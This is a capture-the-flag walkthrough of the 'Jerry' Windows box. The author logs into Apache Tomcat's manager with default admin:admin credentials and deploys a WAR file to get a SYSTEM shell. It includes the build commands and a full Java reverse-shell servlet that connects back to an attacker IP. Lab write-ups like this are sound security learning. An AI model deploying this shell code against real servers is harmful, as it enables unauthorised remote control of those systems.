+++
title = 'Jerry'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

Port 8080 is open - Apache Tomcat 7.0.88. Looked at some CVEs - there are a few, but the relevant web directories don't respond.

Logged into the server status page with default `admin:admin`.

![Jerry (Easy Windows).png](Jerry%20%28Easy%20Windows%29.png)
![Jerry (Easy Windows)-1.png](Jerry%20%28Easy%20Windows%29-1.png)

The box is Windows Server 2012 R2.

![Jerry (Easy Windows)-2.png](Jerry%20%28Easy%20Windows%29-2.png)
![Jerry (Easy Windows)-4.png](Jerry%20%28Easy%20Windows%29-4.png)

`/manager/html`:

![Jerry (Easy Windows)-3.png](Jerry%20%28Easy%20Windows%29-3.png)

Reading the documentation in one of the links, we can upload our own `.war` file - and the app will be reachable at `/<war filename>`. So we just need to make a Web Application Archive containing a reverse shell.

First, create the project directory and write some Java.

![Jerry (Easy Windows)-5.png](Jerry%20%28Easy%20Windows%29-5.png)

```bash
javac -source 1.8 -target 1.8 -cp javax.servlet-api-3.0.1.jar Shell.java
```

Compiling with an older compiler because the Tomcat version is old - the Java versions have to align so Tomcat can understand the `.class` file.

```bash
jar -cvf ShellApp.war -C . .
```

Found the servlet API with the dependencies for this here:

![Jerry (Easy Windows)-6.png](Jerry%20%28Easy%20Windows%29-6.png)

.....and it works.

![Jerry (Easy Windows)-7.png](Jerry%20%28Easy%20Windows%29-7.png)

```java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Shell extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
    throws IOException, ServletException {
        response.setContentType("text/plain");
        PrintWriter out = response.getWriter();

        try {
            Process process = Runtime.getRuntime().exec("cmd /c dir");
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
```

Now modified to run a reverse shell instead:

```java
import java.io.*;
import java.net.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Shell extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
    throws IOException, ServletException {
        String attackerIP = "10.10.16.196";  // Replace with your IP
        int attackerPort = 9000;   // Replace with your port

        try {
            Socket socket = new Socket(attackerIP, attackerPort);

            Process process = Runtime.getRuntime().exec("cmd.exe");
            InputStream pi = process.getInputStream();
            InputStream pe = process.getErrorStream();
            OutputStream po = process.getOutputStream();

            InputStream si = socket.getInputStream();
            OutputStream so = socket.getOutputStream();

            // Thread to send process output to socket
            new Thread(() -> {
                try {
                    copyStream(pi, so);
                } catch (IOException e) {}
            }).start();

            // Thread to send process error to socket
            new Thread(() -> {
                try {
                    copyStream(pe, so);
                } catch (IOException e) {}
            }).start();

            // Thread to send socket input to process input
            new Thread(() -> {
                try {
                    copyStream(si, po);
                } catch (IOException e) {}
            }).start();

        } catch (Exception e) {
            PrintWriter out = response.getWriter();
            out.println("Error: " + e.getMessage());
        }
    }

    private void copyStream(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int length;
        while ((length = in.read(buffer)) != -1) {
            out.write(buffer, 0, length);
            out.flush();
        }
    }
}
```

![Jerry (Easy Windows)-8.png](Jerry%20%28Easy%20Windows%29-8.png)

We're SYSTEM - effectively "root" on Windows. Flags for Windows machines live in the Desktop.
